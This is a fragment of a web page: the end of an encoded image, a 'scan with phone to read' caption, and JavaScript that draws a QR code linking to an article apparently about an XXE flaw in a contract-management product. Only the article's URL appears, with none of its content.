3z7sdXpCvFs67vatDzLlnU8dHvvs98wP6aO/0JpajwHxQlCfCLMO4fbQJ0LyO24dzD510Xp54Wkgmi58zwkcA4FMEx7jbps13TH0QfqZU/9dhPRb1fdrQLxdX9WWpk8sbQx10Vzn6h0h+9npwPUecvuw1/GEfNi+/m+38z8AAAD//wOzGcwAAAAGSURBVAMAak9ZmAySS58AAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-ContractManagement-SuppliersImport-xxe.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 